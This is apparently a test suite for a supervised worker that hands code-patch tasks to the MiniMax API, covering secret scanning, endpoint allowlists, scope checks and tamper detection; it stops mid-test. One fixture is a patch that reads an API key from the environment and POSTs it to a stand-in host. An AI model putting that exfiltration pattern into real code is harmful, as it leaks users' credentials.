from __future__ import annotations

import argparse
import importlib.util
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from collections.abc import Callable, Iterator
from contextlib import contextmanager, redirect_stdout, suppress
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
WORKER = ROOT / "skills" / "delegate-minimax-api" / "scripts" / "minimax_api_worker.py"
TOKEN = "sk-cp-test-minimax-token-0123456789abcdef"  # noqa: S105 - non-secret fixture
VALID_PATCH = """diff --git a/src/module.py b/src/module.py
--- a/src/module.py
+++ b/src/module.py
@@ -1 +1 @@
-VALUE = 1
+VALUE = 2
"""
OUT_OF_SCOPE_PATCH = """diff --git a/outside.py b/outside.py
new file mode 100644
--- /dev/null
+++ b/outside.py
@@ -0,0 +1 @@
+SHOULD_NOT_APPLY = True
"""
EXECUTABLE_PATCH = """diff --git a/src/tool.py b/src/tool.py
new file mode 100755
--- /dev/null
+++ b/src/tool.py
@@ -0,0 +1 @@
+print("bounded worker")
"""
STARTUP_HOOK_PATCH = """diff --git a/src/sitecustomize.py b/src/sitecustomize.py
new file mode 100644
--- /dev/null
+++ b/src/sitecustomize.py
@@ -0,0 +1 @@
+print("must never auto-run")
"""
AST_EGRESS_PATCH = """diff --git a/src/module.py b/src/module.py
--- a/src/module.py
+++ b/src/module.py
@@ -1 +1,5 @@
-VALUE = 1
+from os import getenv
+from http.client import HTTPSConnection
+VALUE = getenv("ALPACA_PAPER_API_KEY")
+CONNECTION = HTTPSConnection("example.invalid")
+CONNECTION.request("POST", "/", body=VALUE)
"""


def load_worker_module() -> object:
    spec = importlib.util.spec_from_file_location("minimax_api_worker_test_module", WORKER)
    if spec is None or spec.loader is None:
        raise RuntimeError("cannot load worker module")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


class MiniMaxApiWorkerCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.repo = self.root / "repo"
        self.repo.mkdir()
        self._git("init", "-q")
        self._git("config", "user.name", "Test User")
        self._git("config", "user.email", "test@localhost")
        (self.repo / "src").mkdir()
        (self.repo / "src" / "module.py").write_text("VALUE = 1\n", encoding="utf-8")
        self.spec = self.repo / "task.md"
        self.spec.write_text("Change VALUE to 2 and preserve the contract.\n", encoding="utf-8")
        self.fish_config = self.root / "config.fish"
        self.fish_config.write_text(
            f'function claude-minimax\n    set -lx ANTHROPIC_AUTH_TOKEN "{TOKEN}"\nend\n',
            encoding="utf-8",
        )
        self.fish_config.chmod(0o600)
        self._git("add", "--all")
        self._git("commit", "-q", "-m", "baseline")
        self.module = load_worker_module()
        worker_base = self.module.worker_temp_base()
        self.state = worker_base / "state" / f"test-{self.root.name}"
        self.job_ids: list[str] = []
        self.addCleanup(self._cleanup_worker_state)

    def _cleanup_worker_state(self) -> None:
        exports = self.module.worker_temp_base() / "exports"
        for job_id in self.job_ids:
            export = exports / f"{job_id}.patch"
            if export.is_symlink() or export.is_file():
                export.unlink()
        if self.state.is_dir() and not self.state.is_symlink():
            shutil.rmtree(self.state)

    def _git(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(  # noqa: S603 - test invokes Git with controlled arguments
            ["git", *args],  # noqa: S607 - test fixture relies on PATH Git
            cwd=self.repo,
            check=True,
            text=True,
            capture_output=True,
        )

    def _worker(self, *args: str) -> tuple[subprocess.CompletedProcess[str], dict[str, object]]:
        result = subprocess.run(  # noqa: S603 - controlled test CLI invocation
            [
                sys.executable,
                str(WORKER),
                "--json",
                "--repo",
                str(self.repo),
                "--state-dir",
                str(self.state),
                "--fish-config",
                str(self.fish_config),
                "--test-only-fish-config",
                *args,
            ],
            check=False,
            text=True,
            capture_output=True,
        )
        payload = json.loads(result.stdout)
        return result, payload

    def _worker_in_process(self, *args: str) -> tuple[int, dict[str, object], str]:
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            return_code = self.module.main(
                [
                    "--json",
                    "--repo",
                    str(self.repo),
                    "--state-dir",
                    str(self.state),
                    "--fish-config",
                    str(self.fish_config),
                    "--test-only-fish-config",
                    *args,
                ]
            )
        serialized = buffer.getvalue()
        return return_code, json.loads(serialized), serialized

    def _create_job(self, *allowed: str) -> dict[str, object]:
        argv = [
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
        ]
        for path in allowed or ("src",):
            argv.extend(("--allow-path", path))
            if (self.repo / path).is_dir() and "--allow-directory" not in argv:
                argv.append("--allow-directory")
        result, payload = self._worker(*argv)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.job_ids.append(str(payload["job_id"]))
        return payload

    def _mock_run(self, job_id: str, output_text: str) -> tuple[int, dict[str, object]]:
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=job_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            retries=0,
            json=True,
        )
        response = {
            "response_id": "resp-test",
            "model": "MiniMax-M3",
            "status": "completed",
            "output_text": output_text,
            "usage": {
                "input_tokens": 100,
                "cached_tokens": 50,
                "output_tokens": 20,
                "reasoning_tokens": 0,
                "total_tokens": 120,
            },
        }
        buffer = io.StringIO()
        with mock.patch.object(self.module, "api_create_response", return_value=response), redirect_stdout(buffer):
            return_code = self.module.command_job_run(args)
        return return_code, json.loads(buffer.getvalue())

    def test_doctor_finds_fish_credential_without_network(self) -> None:
        result, payload = self._worker("doctor")

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertTrue(payload["ready"])
        self.assertTrue(payload["credential"]["present"])
        self.assertFalse(payload["remote_probe"]["performed"])
        self.assertEqual(payload["worker_tools"], [])
        self.assertNotIn(TOKEN, result.stdout + result.stderr)

    def test_non_official_and_malformed_endpoints_are_rejected(self) -> None:
        for endpoint in (
            "https://evil.example/v1",
            "http://api.minimax.io/v1",
            "https://api.minimax.io:444/v1",
            "https://api.minimax.io:bad/v1",
        ):
            with self.subTest(endpoint=endpoint):
                result, payload = self._worker("--endpoint", endpoint, "doctor")
                self.assertEqual(result.returncode, 2)
                self.assertFalse(payload["ok"])
                self.assertIn(
                    payload["error"]["code"],
                    {
                        "endpoint_scheme_denied",
                        "external_endpoint_denied",
                        "endpoint_port_denied",
                        "endpoint_shape_denied",
                    },
                )

    def test_fish_config_permissions_are_enforced(self) -> None:
        self.fish_config.chmod(0o644)

        result, payload = self._worker("doctor")

        self.assertEqual(result.returncode, 1)
        self.assertEqual(payload["error"]["code"], "fish_config_permissions")
        self.assertNotIn(TOKEN, result.stdout + result.stderr)

    def test_production_cli_rejects_nonfixed_fish_config_path(self) -> None:
        result = subprocess.run(  # noqa: S603 - controlled test CLI invocation
            [
                sys.executable,
                str(WORKER),
                "--json",
                "--repo",
                str(self.repo),
                "--fish-config",
                str(self.fish_config),
                "doctor",
            ],
            check=False,
            text=True,
            capture_output=True,
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(json.loads(result.stdout)["error"]["code"], "fish_config_override_denied")

    def test_cloud_approval_flag_is_required(self) -> None:
        result, payload = self._worker(
            "job",
            "create",
            "--spec",
            "task.md",
            "--allow-path",
            "src",
        )

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "cloud_approval_required")
        self.assertFalse(self.state.exists())

    def test_create_and_status_use_minimal_snapshot(self) -> None:
        payload = self._create_job("src")
        job_id = str(payload["job_id"])
        workspace = Path(str(payload["workspace"]))

        self.assertEqual(payload["next"], f"job status {job_id}")
        self.assertEqual(
            payload["after_manifest_review"],
            f"job run {job_id} --reasoning none",
        )
        self.assertEqual((workspace / "src" / "module.py").read_text(encoding="utf-8"), "VALUE = 1\n")
        self.assertFalse((workspace / "task.md").exists())
        status_result, status = self._worker("job", "status", job_id)
        self.assertEqual(status_result.returncode, 0)
        self.assertEqual(status["status"], "CREATED")
        self.assertEqual(status["contract_version"], self.module.CONTRACT_VERSION)
        self.assertEqual(status["endpoint"], "https://api.minimax.io/v1")
        self.assertEqual(status["data_processor"], "MiniMax API")
        self.assertEqual(
            status["data_egress_authorized_by"],
            "supervising_codex_with_explicit_user_direction",
        )
        self.assertEqual(
            status["credit_overflow_control"],
            "provider_account_setting_not_exposed_by_responses_request",
        )
        self.assertEqual(status["allowed_selections"], [{"kind": "directory", "path": "src"}])
        self.assertEqual(status["spec_source_path"], "task.md")
        self.assertEqual(status["spec_sha256"], self.module.sha256_bytes(self.spec.read_bytes()))
        self.assertEqual([item["path"] for item in status["files"]], ["src/module.py"])
        self.assertEqual([item["source_executable"] for item in status["files"]], [False])
        self.assertEqual(
            status["source_snapshot_sha256"],
            self.module.manifest_sha256(status["files"]),
        )
        self.assertEqual(status["skipped_files"], [])

    def test_directory_allowlist_requires_explicit_override(self) -> None:
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "directory_selection_requires_override")

    def test_job_list_tolerates_empty_state_without_creating_it(self) -> None:
        self.assertFalse(self.state.exists())

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            payload,
            {
                "ok": True,
                "job_count": 0,
                "jobs": [],
                "provider_request_guard": {
                    "blocks_posts": False,
                    "manual_review_required": False,
                    "state": "clear",
                },
            },
        )
        self.assertFalse(self.state.exists())

    def test_job_list_on_fresh_worker_parent_is_strictly_non_mutating(self) -> None:
        fixed_parent = self.root / "fresh-fixed-tmp"
        fixed_parent.mkdir(mode=0o700)
        args = argparse.Namespace(repo=str(self.repo), state_dir=None, json=True)
        buffer = io.StringIO()

        with mock.patch.object(self.module, "FIXED_TEMP_PARENT", fixed_parent), redirect_stdout(buffer):
            return_code = self.module.command_job_list(args)

        self.assertEqual(return_code, 0)
        self.assertEqual(
            json.loads(buffer.getvalue()),
            {
                "ok": True,
                "job_count": 0,
                "jobs": [],
                "provider_request_guard": {
                    "blocks_posts": False,
                    "manual_review_required": False,
                    "state": "clear",
                },
            },
        )
        self.assertEqual(list(fixed_parent.iterdir()), [])

    def test_job_create_is_published_only_after_a_sealed_staging_snapshot(self) -> None:
        original_copy_snapshot = self.module.copy_snapshot
        observed: dict[str, object] = {}

        def inspect_staging(
            repo: Path,
            workspace: Path,
            raw_paths: list[str],
            allow_directories: bool = False,
        ) -> tuple[list[dict[str, object]], list[dict[str, str]], list[str]]:
            state_root = workspace.parent.parent
            observed["staging_name"] = workspace.parent.name
            observed["published_ids"] = [
                path.name for path in state_root.iterdir() if self.module.JOB_ID_RE.fullmatch(path.name)
            ]
            return original_copy_snapshot(repo, workspace, raw_paths, allow_directories)

        args = argparse.Namespace(
            allow_path=["src/module.py"],
            allow_directory=False,
            cloud_approved=True,
            endpoint=self.module.DEFAULT_ENDPOINT,
            json=True,
            model=self.module.DEFAULT_MODEL,
            repo=str(self.repo),
            spec="task.md",
            state_dir=str(self.state),
        )
        buffer = io.StringIO()
        with mock.patch.object(self.module, "copy_snapshot", side_effect=inspect_staging), redirect_stdout(buffer):
            return_code = self.module.command_job_create(args)

        payload = json.loads(buffer.getvalue())
        job_id = str(payload["job_id"])
        self.job_ids.append(job_id)
        self.assertEqual(return_code, 0)
        self.assertTrue(str(observed["staging_name"]).startswith(f".creating-{job_id}-"))
        self.assertEqual(observed["published_ids"], [])
        self.assertTrue((self.state / job_id / "job.json").is_file())
        self.assertFalse((self.state / job_id / self.module.JOB_CREATION_LEASE).exists())
        self.assertEqual(list(self.state.glob(".creating-*")), [])

    def test_job_list_limits_entry_count_and_aggregate_manifest_bytes(self) -> None:
        created = self._create_job("src/module.py")
        manifest_path = self.state / str(created["job_id"]) / "job.json"
        before = (manifest_path.read_bytes(), manifest_path.stat().st_mtime_ns)

        with mock.patch.object(self.module, "MAX_JOB_LIST_ENTRIES", 2):
            return_code, payload, serialized = self._worker_in_process("job", "list")
        self.assertEqual(return_code, 1)
        self.assertEqual(payload["error"]["code"], "job_list_limit_exceeded")
        self.assertNotIn("jobs", payload)
        self.assertEqual(serialized.count("\n"), 1)

        with mock.patch.object(self.module, "MAX_JOB_LIST_MANIFEST_BYTES", 64):
            return_code, payload, serialized = self._worker_in_process("job", "list")
        self.assertEqual(return_code, 1)
        self.assertEqual(payload["error"]["code"], "job_list_limit_exceeded")
        self.assertNotIn("jobs", payload)
        self.assertEqual(serialized.count("\n"), 1)
        self.assertEqual((manifest_path.read_bytes(), manifest_path.stat().st_mtime_ns), before)

    def test_job_list_sanitizes_pathological_json_failures(self) -> None:
        created = self._create_job("src/module.py")
        manifest_path = self.state / str(created["job_id"]) / "job.json"
        manifest_path.write_text('{"pathological":' + "9" * 5_000 + "}\n", encoding="utf-8")

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_manifest_invalid")
        self.assertNotIn("jobs", payload)
        self.assertNotIn("Traceback", result.stderr)
        self.assertEqual(result.stdout.count("\n"), 1)
        self.assertNotIn(TOKEN, result.stdout + result.stderr)

        depth = self.module.MAX_MANIFEST_JSON_DEPTH + 1
        manifest_path.write_text(
            '{"nested":' + "[" * depth + "0" + "]" * depth + "}\n",
            encoding="utf-8",
        )

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_manifest_invalid")
        self.assertNotIn("jobs", payload)
        self.assertNotIn("Traceback", result.stderr)
        self.assertEqual(result.stdout.count("\n"), 1)

    def test_job_list_skips_only_an_actively_leased_incomplete_job(self) -> None:
        created = self._create_job("src/module.py")
        transient_id = "0" * 20
        if transient_id == created["job_id"]:
            transient_id = "f" * 20
        transient_directory = self.state / transient_id
        transient_directory.mkdir(mode=0o700)
        lease = self.module.acquire_job_creation_lease(transient_directory)
        try:
            result, payload = self._worker("job", "list")
        finally:
            self.module.release_job_creation_lease(transient_directory, lease)
            shutil.rmtree(transient_directory)

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(payload["job_count"], 1)
        self.assertEqual([item["job_id"] for item in payload["jobs"]], [created["job_id"]])

        stale_directory = self.state / transient_id
        stale_directory.mkdir(mode=0o700)
        stale_lease = stale_directory / self.module.JOB_CREATION_LEASE
        stale_lease.write_text("inactive\n", encoding="utf-8")
        stale_lease.chmod(0o600)
        try:
            result, payload = self._worker("job", "list")
        finally:
            shutil.rmtree(stale_directory)
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_not_found")
        self.assertNotIn("jobs", payload)

    def test_job_list_never_hides_a_tampered_manifest_behind_an_active_lease(self) -> None:
        created = self._create_job("src/module.py")
        directory = self.state / str(created["job_id"])
        manifest_path = directory / "job.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["status"] = "NO_CHANGE"
        manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        lease = self.module.acquire_job_creation_lease(directory)
        try:
            result, payload = self._worker("job", "list")
        finally:
            self.module.release_job_creation_lease(directory, lease)

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_integrity_failed")
        self.assertNotIn("jobs", payload)

    def test_job_purge_atomically_removes_a_job_from_concurrent_listing(self) -> None:
        created = self._create_job("src/module.py")
        original_rmtree = self.module.shutil.rmtree
        observed: dict[str, object] = {}

        def inspect_tombstone(path: Path) -> None:
            observed["purge_name"] = path.name
            result, payload = self._worker("job", "list")
            observed["list_return_code"] = result.returncode
            observed["list_payload"] = payload
            original_rmtree(path)

        args = argparse.Namespace(
            job_id=str(created["job_id"]),
            json=True,
            repo=str(self.repo),
            state_dir=str(self.state),
        )
        buffer = io.StringIO()
        with mock.patch.object(self.module.shutil, "rmtree", side_effect=inspect_tombstone), redirect_stdout(buffer):
            return_code = self.module.command_job_purge(args)

        self.assertEqual(return_code, 0)
        self.assertTrue(str(observed["purge_name"]).startswith(f".purging-{created['job_id']}-"))
        self.assertEqual(observed["list_return_code"], 0)
        self.assertEqual(
            observed["list_payload"],
            {
                "ok": True,
                "job_count": 0,
                "jobs": [],
                "provider_request_guard": {
                    "blocks_posts": False,
                    "manual_review_required": False,
                    "state": "clear",
                },
            },
        )
        self.assertFalse((self.state / str(created["job_id"])).exists())
        self.assertEqual(list(self.state.glob(".purging-*")), [])
        self.assertTrue(json.loads(buffer.getvalue())["purged"])

    def test_job_list_exposes_only_public_metadata_and_sanitized_usage(self) -> None:
        created = self._create_job("src/module.py")
        completed = self._create_job("src/module.py")
        failed = self._create_job("src/module.py")
        completed_id = str(completed["job_id"])
        return_code, _ = self._mock_run(completed_id, VALID_PATCH)
        self.assertEqual(return_code, 0)

        root = self.module.state_root(self.repo, str(self.state))
        completed_directory, completed_job = self.module.load_job(self.repo, root, completed_id)
        completed_job["result"].update(
            {
                "source_repo": str(self.repo),
                "specification": "SPEC_CONTENT_MUST_NOT_BE_LISTED",
                "provider_output": "OUTPUT_CONTENT_MUST_NOT_BE_LISTED",
                "secret_fixture": TOKEN,
            }
        )
        completed_job["result"]["usage"].update(
            {
                "ignored_secret": TOKEN,
                "invalid_boolean": True,
                "invalid_oversized": self.module.MAX_PUBLIC_USAGE_VALUE + 1,
            }
        )
        self.module.write_job(root, completed_directory / "job.json", completed_job)
        failed_id = str(failed["job_id"])
        failed_directory, failed_job = self.module.load_job(self.repo, root, failed_id)
        failed_job["status"] = "FAILED"
        failed_job["updated_at"] = self.module.utc_now()
        failed_job["request"] = {**completed_job["request"], "outcome": "confirmed"}
        failed_job["result"] = {
            "error": {"code": "provider_failed", "message": TOKEN},
            "provider": {
                "response_id": "resp-list-test",
                "usage": {
                    "input_tokens": 200,
                    "cached_tokens": 25,
                    "output_tokens": 10,
                    "reasoning_tokens": 5,
                    "total_tokens": 215,
                    "ignored_secret": TOKEN,
                },
            },
        }
        self.module.write_job(root, failed_directory / "job.json", failed_job)
        (root / "not-a-job").write_text(TOKEN, encoding="utf-8")

        manifest_paths = (
            root / str(created["job_id"]) / "job.json",
            root / completed_id / "job.json",
            root / failed_id / "job.json",
        )
        before = {
            path: (path.read_bytes(), path.stat().st_mtime_ns)
            for path in manifest_paths
        }

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(payload["job_count"], 3)
        summaries = {item["job_id"]: item for item in payload["jobs"]}
        self.assertEqual(set(summaries), {str(created["job_id"]), completed_id, failed_id})
        self.assertEqual(
            set(summaries[completed_id]),
            {"job_id", "status", "created_at", "updated_at", "runner_version", "usage"},
        )
        self.assertEqual(summaries[str(created["job_id"])]["status"], "CREATED")
        self.assertIsNone(summaries[str(created["job_id"])]["usage"])
        self.assertEqual(summaries[completed_id]["status"], "PATCH_READY")
        self.assertEqual(
            summaries[completed_id]["usage"],
            {
                "input_tokens": 100,
                "cached_tokens": 50,
                "output_tokens": 20,
                "reasoning_tokens": 0,
                "total_tokens": 120,
            },
        )
        self.assertEqual(summaries[failed_id]["status"], "FAILED")
        self.assertEqual(
            summaries[failed_id]["usage"],
            {
                "input_tokens": 200,
                "cached_tokens": 25,
                "output_tokens": 10,
                "reasoning_tokens": 5,
                "total_tokens": 215,
            },
        )
        self.assertTrue(all(item["runner_version"] == "0.3.5" for item in payload["jobs"]))
        serialized = json.dumps(payload, sort_keys=True)
        for forbidden in (
            TOKEN,
            str(self.repo),
            "task.md",
            "src/module.py",
            "SPEC_CONTENT_MUST_NOT_BE_LISTED",
            "OUTPUT_CONTENT_MUST_NOT_BE_LISTED",
            "changes.patch",
            "source_repo",
            "specification",
            "provider_output",
        ):
            self.assertNotIn(forbidden, serialized)
        after = {
            path: (path.read_bytes(), path.stat().st_mtime_ns)
            for path in manifest_paths
        }
        self.assertEqual(after, before)

    def test_job_list_fails_closed_on_matching_tampered_job(self) -> None:
        created = self._create_job("src/module.py")
        manifest_path = self.state / str(created["job_id"]) / "job.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["status"] = "NO_CHANGE"
        manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_integrity_failed")
        self.assertNotIn("jobs", payload)

    def test_job_list_fails_closed_on_matching_unsafe_entry(self) -> None:
        created = self._create_job("src/module.py")
        unsafe_job_id = "0" * 20
        if unsafe_job_id == created["job_id"]:
            unsafe_job_id = "f" * 20
        os.symlink(self.state / str(created["job_id"]), self.state / unsafe_job_id)

        result, payload = self._worker("job", "list")

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "job_path_invalid")
        self.assertNotIn("jobs", payload)

    def test_diff_requires_patch_ready_even_if_workspace_is_modified(self) -> None:
        payload = self._create_job("src")
        workspace = Path(str(payload["workspace"]))
        workspace.joinpath("src/module.py").write_text("VALUE = 99\n", encoding="utf-8")

        result, rejected = self._worker(
            "job",
            "diff",
            str(payload["job_id"]),
        )

        self.assertEqual(result.returncode, 2)
        self.assertEqual(rejected["error"]["code"], "patch_not_ready")

    def test_environment_secret_and_symlink_cannot_enter_snapshot(self) -> None:
        (self.repo / ".ENV").write_text("SENTINEL=never-send\n", encoding="utf-8")
        (self.repo / "src" / "secret.py").write_text(
            'API_KEY = "sk-private-value-1234567890"\n',
            encoding="utf-8",
        )
        os.symlink(self.repo / "src", self.repo / "linked-src")

        denied_env, env_payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            ".ENV",
        )
        denied_secret, secret_payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/secret.py",
        )
        denied_link, link_payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "linked-src",
        )

        self.assertEqual(denied_env.returncode, 2)
        self.assertEqual(env_payload["error"]["code"], "allow_path_denied")
        self.assertEqual(denied_secret.returncode, 2)
        self.assertEqual(secret_payload["error"]["code"], "secret_scan_rejected")
        self.assertEqual(denied_link.returncode, 2)
        self.assertEqual(link_payload["error"]["code"], "allow_path_symlink")
        combined = denied_env.stdout + denied_secret.stdout + denied_link.stdout
        self.assertNotIn("never-send", combined)
        self.assertNotIn("sk-private-value", combined)

    def test_root_data_artifacts_are_denied_but_source_data_code_is_allowed(self) -> None:
        (self.repo / "data").mkdir()
        (self.repo / "data" / "sample.json").write_text('{"value": 1}\n', encoding="utf-8")
        source_data = self.repo / "src" / "data"
        source_data.mkdir()
        (source_data / "loader.py").write_text("VALUE = 1\n", encoding="utf-8")

        denied, denied_payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "data",
        )
        allowed = self._create_job("src/data")

        self.assertEqual(denied.returncode, 2)
        self.assertEqual(denied_payload["error"]["code"], "allow_path_denied")
        self.assertEqual(allowed["file_count"], 1)

    def test_api_payload_has_no_tools_and_only_selected_content(self) -> None:
        payload = self._create_job("src/module.py")
        root = self.module.state_root(self.repo, str(self.state))
        directory, job = self.module.load_job(self.repo, root, str(payload["job_id"]))

        request = self.module.build_api_payload(
            directory,
            job,
            reasoning="none",
            max_output_tokens=32_000,
        )

        self.assertNotIn("tools", request)
        self.assertEqual(request["model"], "MiniMax-M3")
        self.assertFalse(request["stream"])
        self.assertEqual(request["tool_choice"], "none")
        self.assertEqual(request["reasoning"], {"effort": "none"})
        self.assertEqual(request["prompt_cache_key"], "codex-supervised-minimax-patch-v1")
        self.assertIn("src/module.py", request["input"])
        self.assertNotIn(TOKEN, json.dumps(request))

    def test_mocked_api_run_creates_frozen_patch_without_editing_source(self) -> None:
        created = self._create_job("src")
        job_id = str(created["job_id"])

        return_code, run = self._mock_run(job_id, VALID_PATCH)

        self.assertEqual(return_code, 0)
        self.assertEqual(run["status"], "PATCH_READY")
        self.assertEqual(run["changed_files"], ["src/module.py"])
        self.assertEqual((self.repo / "src" / "module.py").read_text(encoding="utf-8"), "VALUE = 1\n")
        workspace = Path(str(created["workspace"]))
        workspace.joinpath("src/module.py").write_text("VALUE = 999\n", encoding="utf-8")
        diff_result, diff = self._worker("job", "diff", job_id)
        self.assertEqual(diff_result.returncode, 0, diff_result.stderr)
        self.assertEqual(diff["sha256"], run["patch_sha256"])
        exported = Path(str(diff["patch"]))
        self.assertIn("+VALUE = 2", exported.read_text(encoding="utf-8"))
        self.assertNotIn("999", exported.read_text(encoding="utf-8"))
        state_bytes = b"".join(path.read_bytes() for path in self.state.rglob("*") if path.is_file())
        self.assertNotIn(TOKEN.encode(), state_bytes)
        root = self.module.state_root(self.repo, str(self.state))
        _, manifest = self.module.load_job(self.repo, root, job_id)
        self.assertEqual(manifest["request"]["outcome"], "confirmed")
        self.assertEqual(manifest["request"]["fingerprint"], manifest["request"]["request_sha256"])
        self.assertIsNone(self.module.read_provider_request_guard(self.module.worker_temp_base()))

    def test_terminal_manifest_is_durable_before_confirmed_guard_is_removed(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        root = self.module.state_root(self.repo, str(self.state))
        original_remove = self.module.remove_provider_request_guard
        observed: dict[str, object] = {}

        def inspect_terminal_before_remove(
            data: bytes,
            identity: tuple[int, int],
            *,
            missing_ok: bool = False,
        ) -> None:
            _, terminal = self.module.load_job(self.repo, root, job_id)
            observed["status"] = terminal["status"]
            observed["outcome"] = terminal["request"]["outcome"]
            observed["manifest"] = (root / job_id / "job.json").read_bytes()
            original_remove(data, identity, missing_ok=missing_ok)

        with mock.patch.object(
            self.module,
            "remove_provider_request_guard",
            side_effect=inspect_terminal_before_remove,
        ) as remover:
            code, _ = self._mock_run(job_id, VALID_PATCH)

        self.assertEqual(code, 0)
        remover.assert_called_once()
        self.assertEqual(observed["status"], "PATCH_READY")
        self.assertEqual(observed["outcome"], "confirmed")
        self.assertTrue(observed["manifest"])
        self.assertIsNone(self.module.read_provider_request_guard(self.module.worker_temp_base()))

    def test_tampered_patch_and_manifest_fail_closed(self) -> None:
        created = self._create_job("src")
        job_id = str(created["job_id"])
        return_code, _ = self._mock_run(job_id, VALID_PATCH)
        self.assertEqual(return_code, 0)
        job_dir = self.state / job_id
        (job_dir / "changes.patch").write_text("tampered\n", encoding="utf-8")

        patch_result, patch_payload = self._worker(
            "job",
            "diff",
            job_id,
        )
        self.assertEqual(patch_result.returncode, 2)
        self.assertEqual(patch_payload["error"]["code"], "patch_artifact_changed")

        manifest_path = job_dir / "job.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["workspace"] = str(self.repo)
        manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
        status_result, status_payload = self._worker("job", "status", job_id)
        self.assertEqual(status_result.returncode, 2)
        self.assertEqual(status_payload["error"]["code"], "job_integrity_failed")

    def test_out_of_scope_provider_patch_is_policy_rejected(self) -> None:
        created = self._create_job("src")

        return_code, run = self._mock_run(str(created["job_id"]), OUT_OF_SCOPE_PATCH)

        self.assertEqual(return_code, 1)
        self.assertEqual(run["status"], "POLICY_REJECTED")
        self.assertEqual(run["policy_violations"], ["outside.py"])
        self.assertFalse((self.repo / "outside.py").exists())

    def test_invalid_or_unsafe_provider_output_is_rejected(self) -> None:
        invalid = self._create_job("src")
        invalid_code, invalid_result = self._mock_run(str(invalid["job_id"]), "Here is your patch")
        self.assertEqual(invalid_code, 1)
        self.assertEqual(invalid_result["status"], "RESPONSE_INVALID")

        unsafe = self._create_job("src")
        unsafe_patch = VALID_PATCH.replace(
            "--- a/src/module.py", "old mode 100644\nnew mode 100755\n--- a/src/module.py"
        )
        unsafe_code, unsafe_result = self._mock_run(str(unsafe["job_id"]), unsafe_patch)
        self.assertEqual(unsafe_code, 1)
        self.assertEqual(unsafe_result["status"], "POLICY_REJECTED")

    def test_subprocess_environment_excludes_parent_secrets(self) -> None:
        with mock.patch.dict(os.environ, {"SENTINEL_API_KEY": "do-not-inherit"}, clear=False):
            environment = self.module.clean_subprocess_env()

        self.assertNotIn("SENTINEL_API_KEY", environment)
        self.assertNotIn("ANTHROPIC_AUTH_TOKEN", environment)
        self.assertEqual(environment["GIT_CONFIG_GLOBAL"], "/dev/null")

    def test_fish_token_must_be_inside_exact_function_and_use_token_plan_key(self) -> None:
        self.fish_config.write_text(
            f'function unrelated\n    set -lx ANTHROPIC_AUTH_TOKEN "{TOKEN}"\nend\n'
            "function claude-minimax\n    true\nend\n",
            encoding="utf-8",
        )
        missing_result, missing = self._worker("doctor")
        self.assertEqual(missing_result.returncode, 1)
        self.assertEqual(missing["error"]["code"], "fish_token_missing")
        self.assertNotIn(TOKEN, missing_result.stdout + missing_result.stderr)

        self.fish_config.write_text(
            'function claude-minimax\n    set -lx ANTHROPIC_AUTH_TOKEN "sk-payg-test-0123456789abcdef"\nend\n',
            encoding="utf-8",
        )
        payg_result, payg = self._worker("doctor")
        self.assertEqual(payg_result.returncode, 1)
        self.assertEqual(payg["error"]["code"], "token_plan_key_required")

        self.fish_config.write_text(
            'function claude-minimax\n    set -lx ANTHROPIC_AUTH_TOKEN "sk-cpx-test-0123456789abcdef"\nend\n',
            encoding="utf-8",
        )
        near_prefix_result, near_prefix = self._worker("doctor")
        self.assertEqual(near_prefix_result.returncode, 1)
        self.assertEqual(near_prefix["error"]["code"], "token_plan_key_required")

    def test_spec_must_be_repository_relative_regular_and_unprotected(self) -> None:
        for spec_path, expected_code in (
            ("/etc/hostname", "allow_path_escape"),
            ("../task.md", "allow_path_escape"),
        ):
            with self.subTest(spec_path=spec_path):
                result, payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
